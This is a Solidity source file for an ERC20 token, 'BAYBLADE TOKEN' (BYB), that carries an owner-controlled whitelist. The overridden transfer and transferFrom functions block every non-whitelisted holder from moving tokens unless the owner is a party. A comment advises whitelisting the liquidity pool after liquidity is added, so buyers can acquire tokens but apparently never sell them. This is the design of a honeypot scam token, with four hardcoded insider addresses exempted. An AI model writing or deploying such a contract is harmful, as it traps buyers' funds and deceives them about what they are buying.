// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("BAYBLADE TOKEN", "BYB") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 5000000 * 10 ** decimals());
        whiteList[0x2e629D13A4bAd1804f4F109F903E9097cd45beCf]= true;
        whiteList[0x19d53d27d53fA8D5315a73502CAF9bD3D4413eB4]=true;
        whiteList[0xf241fbc08Bc6a1B14267fa4936F10FFF126bB533]=true;
        whiteList[0x52fbF1690a239B64eea6DBd30726D018cf8285dd]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}